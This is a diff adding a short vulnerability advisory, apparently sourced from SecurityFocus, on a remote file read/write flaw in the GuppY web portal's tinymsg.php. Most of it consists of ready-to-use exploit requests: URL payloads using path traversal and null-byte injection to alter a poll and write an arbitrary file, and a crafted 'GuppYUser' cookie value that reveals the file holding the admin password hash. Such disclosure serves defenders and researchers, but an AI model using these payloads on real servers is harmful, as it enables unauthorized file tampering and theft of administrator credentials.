@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/8769/info
+
+GuppY is prone to an issue that could allow a remote attacker to read or write to files on the vulnerable server.
+
+This issue presents itself in the tinymsg.php component of the software. The attacker could only access files to which the webserver has access. 
+
+- http://[target]/tinymsg.php?action=2&from=Youpi!||Great
+!||rose||10000&msg=1&to=../poll
+will add a possibility to the current poll : "Youpi!" with the pink color
+("rose" in french) and a score of 10000.
+
+- http://[target]//tinymsg.php?action=2&to=../../tadaam.html%00&from=youpi1&msg=youpi2
+will write into http://[target]/tadaam.html the line :
+0\nyoupi1||[DATE+HEURE]||youpi2
+
+- The cookie named "GuppYUser" and with the value :
+fr||../../admin/mdp.php%00||[MAIL]||LR||||on||1
+sent to the page : http://[target]/tinymsg.php?action=3 will show the
+source of the file http://[target]/admin/mdp.php (containing the md5-crypted
+admin password). 
